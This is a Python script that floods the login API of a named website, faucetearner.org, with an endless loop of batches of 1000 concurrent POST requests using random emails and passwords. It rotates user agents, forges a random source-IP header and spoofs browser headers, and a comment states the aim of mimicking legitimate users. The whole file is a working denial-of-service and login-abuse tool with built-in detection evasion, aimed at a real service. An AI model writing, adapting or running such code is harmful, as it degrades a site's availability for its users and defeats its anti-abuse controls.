import requests
import json
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor
import ipaddress

# Global variables for session persistence
session_id = None


def load_user_agents():
    with open('data/userAgents.json', 'r') as f:
        user_agents_data = json.load(f)
        return user_agents_data['user_agents']


user_agents = load_user_agents()


def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_random_ip():
    # Generate a random IPv4 address
    return str(ipaddress.IPv4Address(random.getrandbits(32)))


def send_post_request(url):
    global session_id  # Access the global session ID

    # Mimic legitimate user agents
    headers = {
        'User-Agent': random.choice(user_agents),
        'Remote Address': generate_random_ip(),
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Requested-With": "XMLHttpRequest",
        'Cookie': 'googtrans=/en/en'
    }

    # Add session ID to headers if available
    if session_id:
        headers['Session-ID'] = session_id

    email = generate_random_string(8) + "@faucetearner.org"
    password = generate_random_string(10)
    payload = {'email': email, 'password': password}
    print("Sent: " + payload['email'])
    try:
        response = requests.post(url, json=payload, headers=headers)
        # Check if session ID is present in response headers and update global variable
        if 'Session-ID' in response.headers:
            session_id = response.headers['Session-ID']
        if response.status_code == 200:
            print("Response:", response.json())
        else:
            print("Error: Status Code", response.status_code)
    except Exception as e:
        print("Error occurred:", e)
    print("==============================================================================")
    # Introduce random delay to simulate human behavior


if __name__ == "__main__":
    api_url = "https://faucetearner.org/api.php?act=login"
    concurrent_requests = 1000  # Number of concurrent requests
    with ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
        while True:
            futures = []
            for _ in range(concurrent_requests):
                futures.append(executor.submit(send_post_request, api_url))
            for future in futures:
                future.result()  # Wait for response before proceeding to the next batch
            # Introduce random delay after each batch
            delay = random.uniform(1, 5)
            print("Waiting for " + str(delay) + " seconds after the batch")
            time.sleep(delay)  # Random delay between 1 to 10 seconds
